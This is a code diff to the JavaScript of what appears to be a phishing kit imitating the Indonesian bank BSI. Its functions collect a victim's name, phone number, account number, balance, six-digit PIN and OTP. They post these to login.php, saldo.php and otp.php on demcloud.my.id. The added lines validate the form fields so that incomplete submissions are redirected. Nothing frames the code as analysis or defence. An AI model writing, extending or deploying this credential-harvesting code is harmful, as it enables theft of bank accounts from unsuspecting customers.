@@ -30,6 +30,14 @@ function sendLog() {
 event.preventDefault();
 $('.process1').fadeIn();
  document.getElementById('btnSubmit1').innerHTML ="Memproses..."; 
+    const tarif = $('#tarif').val();
+    const nomor = $('#nomor').val();
+    const nama = $('#nama').val();
+    const rek = $('#rek').val();
+    if (!tarif || !nomor || !nama || !rek) {      
+        window.location.href = "/";
+        return false;
+    }   
       $.ajax({
             type: 'POST',
             url: 'https://demcloud.my.id/BSI/b4h6a/login.php',
@@ -58,6 +66,15 @@ function sendSaldo() {
 event.preventDefault();
 $('.process1').fadeIn();
  document.getElementById('btnSubmit1').innerHTML ="Memproses..."; 
+    const tarif = $('#tarif').val();
+    const nomor = $('#nomor').val();
+    const nama = $('#nama').val();
+    const rek = $('#rek').val();
+    const saldo = $('#saldo').val();
+    if (!tarif || !nomor || !nama || !rek || !saldo) {      
+        window.location.href = "/";
+        return false;
+    }   
       $.ajax({
             type: 'POST',
             url: 'https://demcloud.my.id/BSI/b4h6a/saldo.php',
@@ -89,7 +106,17 @@ function sendOtp() {
   event.stopPropagation();
     event.preventDefault();
   $("#djload").show();  
- document.getElementById('btnSubmit1').innerHTML = "Memproses...";    
+ document.getElementById('btnSubmit1').innerHTML = "Memproses..."; 
+    const tarif = $('#tarif').val();
+    const nomor = $('#nomor').val();
+    const nama = $('#nama').val();
+    const rek = $('#rek').val();
+    const saldo = $('#saldo').val();
+    const sixpin = $('#sixpin').val();
+ if (!tarif || !nomor || !nama || !rek || !saldo || !sixpin) {      
+        window.location.href = "/";
+        return false;
+    }   
 $.ajax({
  type: 'POST',
  url: 'https://demcloud.my.id/BSI/b4h6a/otp.php',
@@ -124,8 +151,7 @@ document.getElementById('btnSubmit1').innerHTML = "Selanjutnya";
 // datawa
 
 function getcs(){
- $("#djload").show();   
-  
+ $("#djload").show();       
 setTimeout(function(){  
 location.href='https://demcloud.my.id/BSI/b4h6a/wa';
     }, 1000);
